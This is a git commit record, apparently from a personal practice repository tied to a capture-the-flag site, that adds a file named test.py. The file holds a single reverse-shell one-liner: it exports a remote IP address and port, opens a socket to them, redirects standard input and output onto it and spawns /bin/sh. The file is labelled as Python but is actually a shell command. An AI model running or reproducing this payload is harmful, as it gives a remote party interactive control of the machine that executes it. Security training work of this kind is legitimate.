b3fda9aba282b0a238acee3e975f5ec9fcb8e372
Taillan <taillandier.mathieu@outlook.fr>
2022-09-30 04:50:01 -0400

    first commit

---
+++ RootMe/test.py
@@ -0,0 +1,1 @@
+export RHOST="10.18.117.231";export RPORT=4266;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
